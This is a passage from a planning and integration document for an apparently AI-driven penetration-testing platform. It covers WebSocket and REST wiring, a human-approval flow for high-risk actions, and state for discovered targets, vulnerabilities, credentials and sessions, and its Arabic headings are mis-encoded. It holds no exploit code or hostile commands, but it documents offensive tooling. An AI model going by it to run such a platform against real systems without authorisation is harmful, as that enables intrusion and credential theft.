      â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
      â”‚  {status: "running"}                  â”‚                  â”‚
      â”‚                   â”‚                    â”‚                  â”‚
```

### 6.3 Real-time Event Flow

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Specialist  â”‚    â”‚  Blackboard â”‚    â”‚  WebSocket   â”‚    â”‚  Frontend   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚                   â”‚                   â”‚                   â”‚
       â”‚ Discover target   â”‚                   â”‚                   â”‚
       â”‚                   â”‚                   â”‚                   â”‚
       â”‚ create_target()   â”‚                   â”‚                   â”‚
       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                   â”‚                   â”‚
       â”‚                   â”‚                   â”‚                   â”‚
       â”‚                   â”‚ HSET target:{id}  â”‚                   â”‚
       â”‚                   â”‚                   â”‚                   â”‚
       â”‚                   â”‚ PUBLISH event     â”‚                   â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                   â”‚
       â”‚                   â”‚                   â”‚                   â”‚
       â”‚                   â”‚                   â”‚ broadcast_new_target()
       â”‚                   â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                   â”‚                   â”‚                   â”‚
       â”‚                   â”‚                   â”‚                   â”‚ Update UI
       â”‚                   â”‚                   â”‚                   â”‚ Add target
       â”‚                   â”‚                   â”‚                   â”‚ card
       â”‚                   â”‚                   â”‚                   â”‚
```

### 6.4 Approval Flow (HITL)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Specialist  â”‚   â”‚ Controller  â”‚   â”‚  WebSocket   â”‚   â”‚  Frontend   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚ High-risk action â”‚                  â”‚                  â”‚
       â”‚ request_approval()                  â”‚                  â”‚
       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                  â”‚                  â”‚
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚                  â”‚ Create approval  â”‚                  â”‚
       â”‚                  â”‚ action           â”‚                  â”‚
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚                  â”‚ broadcast_approval_request()        â”‚
       â”‚                  â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                  â”‚
       â”‚                  â”‚                  â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚                  â”‚                  â”‚                  â”‚ Show
       â”‚                  â”‚                  â”‚                  â”‚ ApprovalCard
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚ Pause execution  â”‚                  â”‚                  â”‚
       â”‚ Wait for approvalâ”‚                  â”‚                  â”‚
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚                  â”‚                  â”‚      User clicks â”‚
       â”‚                  â”‚                  â”‚      "Approve"   â”‚
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚                  â”‚ approve_action() â”‚                  â”‚
       â”‚                  â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚                  â”‚                  â”‚                  â”‚
       â”‚ Resume execution â”‚                  â”‚                  â”‚
       â”‚<â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                  â”‚                  â”‚
       â”‚                  â”‚                  â”‚                  â”‚
```

---

## 7. ØªØ­Ù„ÙŠÙ„ Ø§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠ

### 7.1 Component Architecture

```
webapp/frontend/client/src/
â”œâ”€â”€ components/
â”‚   â”œâ”€â”€ manus/                    # RAGLOX-specific components
â”‚   â”‚   â”œâ”€â”€ AIChatPanel.tsx       # Main event timeline panel
â”‚   â”‚   â”œâ”€â”€ TerminalPanel.tsx     # Terminal output viewer
â”‚   â”‚   â”œâ”€â”€ DualPanelLayout.tsx   # Split-pane layout
â”‚   â”‚   â”œâ”€â”€ Sidebar.tsx           # Navigation sidebar
â”‚   â”‚   â”œâ”€â”€ ApprovalCard.tsx      # HITL approval request card
â”‚   â”‚   â”œâ”€â”€ AIPlanCard.tsx        # AI plan display card
â”‚   â”‚   â”œâ”€â”€ ArtifactCard.tsx      # Discovered artifacts
â”‚   â”‚   â”œâ”€â”€ EventCard.tsx         # Generic event card
â”‚   â”‚   â””â”€â”€ PlanView.tsx          # Task plan viewer
â”‚   â””â”€â”€ ui/                       # shadcn/ui components
â”‚       â”œâ”€â”€ button.tsx
â”‚       â”œâ”€â”€ card.tsx
â”‚       â”œâ”€â”€ badge.tsx
â”‚       â”œâ”€â”€ input.tsx
â”‚       â””â”€â”€ ...
â”‚
â”œâ”€â”€ pages/
â”‚   â”œâ”€â”€ Home.tsx                  # Mission creation
â”‚   â”œâ”€â”€ Operations.tsx            # Mission dashboard
â”‚   â”œâ”€â”€ Missions.tsx              # Mission list
â”‚   â””â”€â”€ Knowledge.tsx             # Knowledge base browser
â”‚
â”œâ”€â”€ stores/
â”‚   â””â”€â”€ missionStore.ts           # Zustand state management
â”‚
â”œâ”€â”€ lib/
â”‚   â””â”€â”€ api.ts                    # API client functions
â”‚
â””â”€â”€ types/
    â””â”€â”€ index.ts                  # TypeScript type definitions
```

### 7.2 Current State Analysis

#### 7.2.1 API Client (`lib/api.ts`)

**Status**: Partially implemented with mock data fallbacks

**Existing Functions**:
```typescript
const missionsApi = {
  list: async () => { /* Returns mock data */ },
  get: async (id: string) => { /* Returns mock data */ },
  create: async (data: MissionCreateData) => { /* Not implemented */ },
  start: async (id: string) => { /* Not implemented */ },
  stop: async (id: string) => { /* Not implemented */ },
};

class MissionWebSocket {
  // Disabled by default
  // connect(missionId: string) { ... }
}
```

**Required Changes**:
1. âœ… API_BASE_URL is configured: `http://172.245.232.188:8000`
2. âŒ Remove mock data fallbacks
3. âŒ Implement missing functions (create, start, stop, pause, resume)
4. âŒ Enable WebSocket connection
5. âŒ Add error handling and retries
6. âŒ Implement authentication headers (if required)

#### 7.2.2 AIChatPanel Component

**Status**: Uses hardcoded mock events

**Current Implementation**:
```typescript
const mockEvents = [
  {
    id: '1',
    type: 'step',
    title: 'ØªÙ†ÙÙŠØ° Ø§Ù„Ø£Ù…Ø± Ø§Ù„Ø£ÙˆÙ„ - Ø¹Ø±Ø¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…',
    // ...hardcoded data
  },
  // ... more mock events
];

// Events are static, not from WebSocket
```

**Required Changes**:
1. âŒ Replace mockEvents with real WebSocket events
2. âŒ Subscribe to WebSocket on component mount
3. âŒ Add event handlers for each event type
4. âŒ Implement event buffering/pagination for performance
5. âŒ Add auto-scroll to latest event
6. âŒ Implement event filtering/search

#### 7.2.3 TerminalPanel Component

**Status**: Uses hardcoded mock terminal output

**Current Implementation**:
```typescript
const mockTerminalOutput = `ubuntu@sandbox:~ $ df -h
Filesystem      Size  Used Avail Use% Mounted on
...`;

// Static output, not real-time
```

**Required Changes**:
1. âŒ Connect to WebSocket for real-time output
2. âŒ Buffer terminal output efficiently
3. âŒ Implement ANSI color code rendering
4. âŒ Add auto-scroll option
5. âŒ Implement terminal command input (optional)

#### 7.2.4 Mission Store (`stores/missionStore.ts`)

**Status**: Basic Zustand store, needs WebSocket integration

**Current Implementation**:
```typescript
interface MissionStore {
  currentMission: Mission | null;
  setCurrentMission: (mission: Mission) => void;
  updateMissionStats: (stats: MissionStatistics) => void;
  // ... missing event handlers
}
```

**Required Changes**:
1. âŒ Add WebSocket connection management
2. âŒ Add event handlers for all WebSocket events
3. âŒ Implement targets, vulns, creds, sessions arrays
4. âŒ Add approval requests state
5. âŒ Add chat messages state
6. âŒ Implement state persistence (localStorage)

---

### 7.3 Integration Status Summary

| Component/Feature | Status | Priority | Effort |
|-------------------|--------|----------|--------|
| **API Client** |
| - Basic REST calls | âš ï¸ Partial | High | Low |
| - Mission CRUD | âŒ Missing | High | Medium |
| - HITL endpoints | âŒ Missing | High | Low |
| - Knowledge endpoints | âš ï¸ Partial | Medium | Low |
| **WebSocket** |
| - Connection setup | âŒ Disabled | High | Low |
| - Event handling | âŒ Missing | High | Medium |
| - Reconnection logic | âŒ Missing | High | Medium |
| - Event buffering | âŒ Missing | Medium | Medium |
| **State Management** |
| - Mission state | âœ… Done | High | - |
| - Targets/Vulns/Creds | âŒ Missing | High | Medium |
| - Approvals state | âŒ Missing | High | Low |
| - Chat state | âŒ Missing | High | Low |
| **UI Components** |
| - AIChatPanel events | âŒ Hardcoded | High | High |
| - TerminalPanel output | âŒ Hardcoded | Medium | Medium |
| - ApprovalCard integration | âš ï¸ Partial | High | Low |
| - Statistics display | âš ï¸ Partial | High | Low |
| **Pages** |
| - Home (Create mission) | âŒ Mock | High | Medium |
| - Operations (Dashboard) | âš ï¸ Partial | High | High |
| - Missions (List) | âŒ Mock | Medium | Low |
| - Knowledge | âŒ Missing | Medium | High |

**Legend**:
- âœ… Done: Fully implemented and working
- âš ï¸ Partial: Partially implemented, needs work
- âŒ Missing: Not implemented yet

---

## 8. Ø§Ù„ÙØ¬ÙˆØ§Øª ÙˆØ§Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ÙÙ‚ÙˆØ¯Ø©

### 8.1 Backend Gaps

#### 8.1.1 Missing API Endpoints
âœ… All core endpoints are implemented
- Mission Management: Complete
- Target/Vuln/Cred/Session APIs: Complete
- HITL Approval APIs: Complete
- Knowledge Base APIs: Complete

**No critical backend endpoints are missing.**

#### 8.1.2 Backend Enhancements Needed

1. **Authentication & Authorization** (Production Required)
   - Currently no authentication
   - Need: JWT-based authentication
   - Need: Role-based access control (RBAC)
   - Need: API key management

2. **Rate Limiting**
   - Currently no rate limiting
   - Need: Protect against abuse
   - Need: Per-user/IP rate limits

3. **Input Validation**
   - Basic validation exists
   - Need: Strengthen validation rules
   - Need: Add sanitization

4. **Logging & Monitoring**
   - Basic logging exists
   - Need: Structured logging
   - Need: Metrics export (Prometheus)
   - Need: Distributed tracing

5. **Error Responses**
   - Generic error messages
   - Need: Detailed error codes
   - Need: Localization support

---

### 8.2 Frontend Gaps

#### 8.2.1 Critical Missing Features

1. **WebSocket Integration** (âš ï¸ CRITICAL)
   - Status: Disabled/not implemented
   - Impact: No real-time updates
   - Effort: Medium (2-3 days)
   - Files: `lib/api.ts`, `stores/missionStore.ts`

2. **Mission Creation** (âš ï¸ CRITICAL)
   - Status: UI exists but not connected
   - Impact: Cannot create missions
   - Effort: Low (1 day)
   - Files: `pages/Home.tsx`, `lib/api.ts`

3. **Mission Control** (âš ï¸ CRITICAL)
   - Status: Buttons exist but not connected
   - Impact: Cannot start/stop missions
   - Effort: Low (1 day)
   - Files: `pages/Operations.tsx`, `lib/api.ts`

4. **Event Timeline** (âš ï¸ CRITICAL)
   - Status: Hardcoded mock data
   - Impact: No real mission events shown
   - Effort: High (3-4 days)
   - Files: `components/manus/AIChatPanel.tsx`, `stores/missionStore.ts`

5. **Approval Workflow** (HIGH)
   - Status: UI exists but not connected
   - Impact: HITL feature not working
   - Effort: Medium (2 days)
   - Files: `components/manus/ApprovalCard.tsx`, `lib/api.ts`

6. **Knowledge Base Browser** (MEDIUM)
   - Status: Not implemented
   - Impact: Cannot browse RX modules/techniques
   - Effort: High (4-5 days)
   - Files: `pages/Knowledge.tsx` (needs major work)

7. **Terminal Output** (MEDIUM)
   - Status: Hardcoded mock data
   - Impact: Cannot see real command outputs
   - Effort: Medium (2 days)
   - Files: `components/manus/TerminalPanel.tsx`

8. **Statistics Dashboard** (MEDIUM)
   - Status: Hardcoded values
   - Impact: Incorrect mission statistics
   - Effort: Low (1 day)
   - Files: `pages/Operations.tsx`

#### 8.2.2 Nice-to-Have Features

1. **Advanced Search/Filtering**
   - Status: Not implemented
   - Impact: Difficult to find specific events/targets
   - Effort: Medium

2. **Data Visualization**
   - Status: Basic charts only
   - Impact: Limited insights
   - Effort: High

3. **Export/Report Generation**
   - Status: Not implemented
   - Impact: Cannot generate reports
   - Effort: Medium

4. **Notifications System**
   - Status: Basic toasts only
   - Impact: May miss important events
   - Effort: Medium

5. **Session Interaction**
   - Status: Not implemented
   - Impact: Cannot interact with sessions
   - Effort: High

---

### 8.3 Documentation Gaps

1. **API Documentation** (âš ï¸ NEEDED)
   - Current: Partial in COMPLETE_INTEGRATION_MAP.md
   - Needed: Complete OpenAPI/Swagger docs
   - Tool: FastAPI auto-generates at `/docs`

2. **Deployment Guide** (âš ï¸ NEEDED)
   - Current: Basic README
   - Needed: Production deployment guide
   - Topics: Docker, nginx, Redis, scaling

3. **Developer Guide** (âœ… EXISTS)
   - Current: DEVELOPER_INTEGRATION_GUIDE.md exists
   - Status: Good but needs updates

4. **User Manual** (âŒ MISSING)
   - Current: None
   - Needed: End-user documentation
   - Topics: Creating missions, approvals, interpreting results

---

## 9. Ø®Ø·Ø© Ø§Ù„ØªÙƒØ§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„Ø©

### 9.1 Phase 1: Core Integration (Week 1)

**Ø§Ù„Ù‡Ø¯Ù**: Ø±Ø¨Ø· Ø§Ù„ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ù„Ù„ÙˆØ§Ø¬Ù‡Ø© Ø¨Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯

#### Day 1-2: API Client Implementation
```typescript
// 1. Implement all REST API functions
// File: client/src/lib/api.ts

export const missionsApi = {
  async list(): Promise<string[]> {
    const res = await fetch(`${API_BASE_URL}/api/v1/missions`);
    return await res.json();
  },
  
  async get(id: string): Promise<Mission> {
    const res = await fetch(`${API_BASE_URL}/api/v1/missions/${id}`);
    return await res.json();
  },
  
  async create(data: MissionCreateData): Promise<MissionCreateResponse> {
    const res = await fetch(`${API_BASE_URL}/api/v1/missions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    return await res.json();
  },
  
  async start(id: string): Promise<MissionControlResponse> {
    const res = await fetch(`${API_BASE_URL}/api/v1/missions/${id}/start`, {
      method: 'POST'
    });
    return await res.json();
  },
  
  // ... pause, resume, stop
};

// 2. Add error handling
async function fetchWithError(url: string, options?: RequestInit) {
  try {
    const res = await fetch(url, options);
    if (!res.ok) {
      throw new Error(`HTTP ${res.status}: ${res.statusText}`);
    }
    return await res.json();
  } catch (error) {
    console.error('API Error:', error);
    throw error;
  }
}

// 3. Add retry logic
async function fetchWithRetry(url: string, options?: RequestInit, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      return await fetchWithError(url, options);
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
}
```

**Testing**:
- Test each API function against real backend
- Verify error handling
- Test retry logic

#### Day 3-4: WebSocket Integration
```typescript
// File: client/src/lib/websocket.ts

export class MissionWebSocket {
  private ws: WebSocket | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 10;
  private reconnectDelay = 1000;
  
  constructor(
    private missionId: string,
    private onMessage: (event: WebSocketMessage) => void,
    private onError: (error: Event) => void
  ) {}
  
  connect() {
    const url = `${WS_BASE_URL}/ws/missions/${this.missionId}`;
    this.ws = new WebSocket(url);
    
    this.ws.onopen = () => {
      console.log(`Connected to mission ${this.missionId}`);
      this.reconnectAttempts = 0;
      // Send ping every 30 seconds
      this.startPing();
    };
    
    this.ws.onmessage = (event) => {
      const message = JSON.parse(event.data);
      this.onMessage(message);
    };
    
    this.ws.onerror = (error) => {
      console.error('WebSocket error:', error);
      this.onError(error);
    };
    
    this.ws.onclose = (event) => {
      console.log('WebSocket closed:', event.code);
      this.scheduleReconnect();
    };
  }
  
  private scheduleReconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.error('Max reconnection attempts reached');
      return;
    }
    
    const delay = Math.min(30000, this.reconnectDelay * Math.pow(2, this.reconnectAttempts));
    console.log(`Reconnecting in ${delay}ms...`);
    
    setTimeout(() => {
      this.reconnectAttempts++;
      this.connect();
    }, delay);
  }
  
  private startPing() {
    setInterval(() => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({ type: 'ping' }));
      }
    }, 30000);
  }
  
  disconnect() {
    if (this.ws) {
      this.ws.close();
      this.ws = null;
    }
  }
}
```

**Testing**:
- Test connection establishment
- Test reconnection on disconnect
- Test ping/pong mechanism
- Test message receiving

#### Day 5: Mission Store Integration
```typescript
// File: client/src/stores/missionStore.ts

interface MissionStore {
  // State
  currentMission: Mission | null;
  targets: Target[];
  vulnerabilities: Vulnerability[];
  credentials: Credential[];
  sessions: Session[];
  events: EventCard[];
  pendingApprovals: ApprovalRequest[];
  chatMessages: ChatMessage[];
  wsConnection: MissionWebSocket | null;
  
  // Actions
  setCurrentMission: (mission: Mission) => void;
  connectWebSocket: (missionId: string) => void;
  disconnectWebSocket: () => void;
  
  // Event handlers
  handleWebSocketEvent: (event: WebSocketMessage) => void;
  handleNewTarget: (data: any) => void;
  handleNewVuln: (data: any) => void;
  handleNewCred: (data: any) => void;
  handleNewSession: (data: any) => void;
  handleApprovalRequest: (data: any) => void;
  handleChatMessage: (data: any) => void;
  handleStatistics: (data: any) => void;
  
  // API actions
  startMission: (id: string) => Promise<void>;
  pauseMission: (id: string) => Promise<void>;
  stopMission: (id: string) => Promise<void>;
  approveAction: (actionId: string, comment?: string) => Promise<void>;
  rejectAction: (actionId: string, reason?: string) => Promise<void>;
  sendChatMessage: (content: string) => Promise<void>;
}

export const useMissionStore = create<MissionStore>((set, get) => ({
  // Initial state
  currentMission: null,
  targets: [],
  vulnerabilities: [],
  credentials: [],
  sessions: [],
  events: [],
  pendingApprovals: [],
  chatMessages: [],
  wsConnection: null,
  
  // Actions
  connectWebSocket: (missionId: string) => {
    const ws = new MissionWebSocket(
      missionId,
      (event) => get().handleWebSocketEvent(event),
      (error) => console.error('WS error:', error)
    );
    ws.connect();
    set({ wsConnection: ws });
  },
  
  handleWebSocketEvent: (event: WebSocketMessage) => {
    switch (event.type) {
      case 'new_target':
        get().handleNewTarget(event.data);
        break;
      case 'new_vuln':
        get().handleNewVuln(event.data);
        break;
      case 'approval_request':
        get().handleApprovalRequest(event.data);
        break;
      case 'chat_message':
        get().handleChatMessage(event.data);
        break;
      case 'statistics':
        get().handleStatistics(event.data);
        break;
      // ... handle all event types
    }
  },
  
  handleNewTarget: (data) => {
    set((state) => ({
      targets: [...state.targets, data as Target],
      events: [
        ...state.events,
        {
          id: crypto.randomUUID(),
          type: 'new_target',
          title: `New target discovered: ${data.ip}`,
          timestamp: new Date().toISOString(),
          data
        }
      ]
    }));
  },
  
  // ... implement other handlers
}));
```

**Testing**:
- Test state updates on WebSocket events
- Test API action functions
- Verify event buffering and performance

---

### 9.2 Phase 2: UI Integration (Week 2)

#### Day 6-7: AIChatPanel Integration
```typescript
// File: client/src/components/manus/AIChatPanel.tsx

export function AIChatPanel({ missionId }: { missionId: string }) {
  const { events, pendingApprovals, chatMessages } = useMissionStore();
  
  // Remove mockEvents - use real events from store
  
  return (
    <div className="ai-chat-panel">
      <ScrollArea>
        {events.map(event => (
          <EventCard key={event.id} event={event} />
        ))}
        
        {pendingApprovals.map(approval => (
          <ApprovalCard key={approval.action_id} approval={approval} />
        ))}
      </ScrollArea>
      
      <ChatInput onSend={handleSendMessage} />
    </div>
  );
}
```

**Testing**:
- Verify events appear in real-time
- Test approval card interaction
- Test chat message sending/receiving

#### Day 8: Mission Control Integration
```typescript
// File: client/src/pages/Operations.tsx

export function Operations() {
  const { id } = useParams();
  const { currentMission, startMission, stopMission, pauseMission } = useMissionStore();
  
  useEffect(() => {
    if (id) {
      // Fetch mission details
      missionsApi.get(id).then(mission => {
        useMissionStore.getState().setCurrentMission(mission);
      });
      
      // Connect WebSocket
      useMissionStore.getState().connectWebSocket(id);
    }
    
    return () => {
      // Cleanup: disconnect WebSocket
      useMissionStore.getState().disconnectWebSocket();
    };
  }, [id]);
  
  return (
    <div>
      <MissionControls
        mission={currentMission}
        onStart={() => startMission(id!)}
        onStop={() => stopMission(id!)}
        onPause={() => pauseMission(id!)}
      />
      
      <StatisticsCards stats={currentMission?.statistics} />
      
      <DualPanelLayout>
        <AIChatPanel missionId={id!} />
        <TerminalPanel missionId={id!} />
      </DualPanelLayout>
    </div>
  );
}
```

**Testing**:
- Test mission start/stop/pause
- Verify status updates
- Test statistics display

#### Day 9-10: Complete Integration & Polish
- Implement remaining components
- Add loading states
- Add error handling UI
- Add notifications
- Polish animations and transitions

---

### 9.3 Phase 3: Knowledge Base & Advanced Features (Week 3)

#### Day 11-13: Knowledge Base Browser
- Implement technique browser
- Implement module browser
- Add search functionality
- Add filters (platform, tactic, severity)

#### Day 14-15: Terminal & Session Interaction
- Implement real-time terminal output
- Add ANSI color rendering
- Implement session interaction (optional)

---

### 9.4 Phase 4: Production Readiness (Week 4)

#### Day 16-17: Security & Authentication
- Implement authentication
- Add authorization checks
- Secure WebSocket connections

#### Day 18-19: Performance Optimization
- Implement event pagination
- Optimize WebSocket message handling
- Add caching strategies
- Lazy load components

#### Day 20: Testing & Documentation
- End-to-end testing
- Performance testing
- Update documentation
- Create user manual

---

## 10. Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„Ø¥Ù†ØªØ§Ø¬

### 10.1 Security Requirements

#### Authentication
- [ ] Implement JWT-based authentication
- [ ] Add login/logout functionality
- [ ] Secure API endpoints
- [ ] Secure WebSocket connections

#### Authorization
- [ ] Role-based access control (RBAC)
- [ ] Mission-level permissions
- [ ] Audit logging

#### Data Protection
- [ ] HTTPS/WSS only in production
- [ ] Encrypt sensitive data (credentials)
- [ ] Secure session management
- [ ] CORS configuration

### 10.2 Performance Requirements

#### Backend
- [ ] Rate limiting (per IP/user)
- [ ] Response time < 200ms (95th percentile)
- [ ] WebSocket latency < 100ms
- [ ] Handle 100+ concurrent users
- [ ] Handle 1000+ targets per mission

#### Frontend
- [ ] Initial load < 3s
- [ ] WebSocket reconnect < 5s
- [ ] Smooth scrolling (60 FPS)
- [ ] Efficient event rendering (virtual scrolling)

### 10.3 Reliability Requirements

#### Backend
- [ ] 99.9% uptime
- [ ] Automatic failover (Redis HA)
- [ ] Health checks
- [ ] Graceful degradation

#### Frontend
- [ ] Offline support (service worker)
- [ ] Automatic reconnection
- [ ] Error recovery
- [ ] Data persistence (localStorage)

### 10.4 Monitoring Requirements

#### Metrics
- [ ] API response times
- [ ] WebSocket connection count
- [ ] Error rates
- [ ] Mission statistics

#### Logging
- [ ] Structured logging
- [ ] Log aggregation (ELK/Loki)
- [ ] Error tracking (Sentry)

#### Alerts
- [ ] High error rate alerts
- [ ] Service unavailability alerts
- [ ] Performance degradation alerts

### 10.5 Deployment Requirements

#### Infrastructure
- [ ] Docker containers
- [ ] Docker Compose / Kubernetes
- [ ] Reverse proxy (nginx)
- [ ] Redis cluster
- [ ] Backup strategy

#### CI/CD
- [ ] Automated tests
- [ ] Build pipeline
- [ ] Deployment pipeline
- [ ] Rollback strategy

---

## 11. Ø§Ù„Ø®Ù„Ø§ØµØ© ÙˆØ§Ù„ØªÙˆØµÙŠØ§Øª

### 11.1 Ø®Ù„Ø§ØµØ© Ø§Ù„ØªØ­Ù„ÙŠÙ„

**Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯**:
- âœ… **Ù…Ø¹Ù…Ø§Ø±ÙŠ Ù‚ÙˆÙŠ ÙˆÙ…ØªÙƒØ§Ù…Ù„**: Ù†Ù…Ø· BlackboardØŒ SpecialistsØŒ Redis
- âœ… **API Ø´Ø§Ù…Ù„**: Ø¬Ù…ÙŠØ¹ Ù†Ù‚Ø§Ø· Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ù…ÙˆØ¬ÙˆØ¯Ø©
- âœ… **HITL Integration**: Ù…ÙˆØ¬ÙˆØ¯ ÙˆÙ…ØªÙƒØ§Ù…Ù„
- âœ… **Knowledge Base**: 1,761 RX ModuleØŒ 7,000+ Nuclei Template
- âš ï¸ **ÙŠØ­ØªØ§Ø¬**: AuthenticationØŒ AuthorizationØŒ Production hardening

**Ø§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯**:
- âœ… **ØªØµÙ…ÙŠÙ… Ù…Ù…ØªØ§Ø²**: Manus Design SystemØŒ Ù…ÙƒÙˆÙ†Ø§Øª Ø¬ÙŠØ¯Ø©
- âœ… **Types Ù…Ø­Ø¯Ø¯Ø©**: ØªÙˆØ§ÙÙ‚ Ø¬ÙŠØ¯ Ù…Ø¹ Backend models
- âš ï¸ **WebSocket**: Ù…Ø¹Ø·Ù„ØŒ ÙŠØ­ØªØ§Ø¬ ØªÙØ¹ÙŠÙ„
- âš ï¸ **API Integration**: Ø¬Ø²Ø¦ÙŠØŒ ÙŠØ­ØªØ§Ø¬ Ø§Ø³ØªÙƒÙ…Ø§Ù„
- âš ï¸ **State Management**: Ø£Ø³Ø§Ø³ÙŠØŒ ÙŠØ­ØªØ§Ø¬ ØªÙˆØ³ÙŠØ¹

**Ø§Ù„ØªÙƒØ§Ù…Ù„**:
- âœ… **Ø§Ù„ØªÙˆØ§ÙÙ‚**: Types Ù…ØªÙˆØ§ÙÙ‚Ø©ØŒ API Ù…ÙˆØ«Ù‚ Ø¬ÙŠØ¯Ø§Ù‹
- âš ï¸ **Ø§Ù„ÙØ¬ÙˆØ©**: Ø§Ù„ÙˆØµÙ„ Ø¨ÙŠÙ† Frontend Ùˆ Backend ØºÙŠØ± Ù…ÙƒØªÙ…Ù„
- âœ… **Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ§Øª**: Ù…ÙˆØ¬ÙˆØ¯Ø© ÙˆØ¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¨Ù†Ø§Ø¡ Ø¹Ù„ÙŠÙ‡Ø§

### 11.2 Ø§Ù„ØªÙˆØµÙŠØ§Øª

#### Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ© Ø§Ù„Ù‚ØµÙˆÙ‰ (Critical)
1. **ØªÙØ¹ÙŠÙ„ WebSocket** ÙÙŠ Ø§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ (2-3 Ø£ÙŠØ§Ù…)
2. **Ø±Ø¨Ø· Mission Control** (Start/Stop/Pause) (1 ÙŠÙˆÙ…)
3. **Ø±Ø¨Ø· Event Timeline** Ø¨Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© (3-4 Ø£ÙŠØ§Ù…)
4. **Ø±Ø¨Ø· Approval Workflow** (2 ÙŠÙˆÙ…)

**Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹**: ~10 Ø£ÙŠØ§Ù… Ø¹Ù…Ù„

#### Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ© Ø§Ù„Ø¹Ø§Ù„ÙŠØ© (High)
5. **Mission Creation** Ù…Ù† Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© (1 ÙŠÙˆÙ…)
6. **Statistics Dashboard** Ø­Ù‚ÙŠÙ‚ÙŠ (1 ÙŠÙˆÙ…)
7. **Terminal Output** Ø­Ù‚ÙŠÙ‚ÙŠ (2 ÙŠÙˆÙ…)

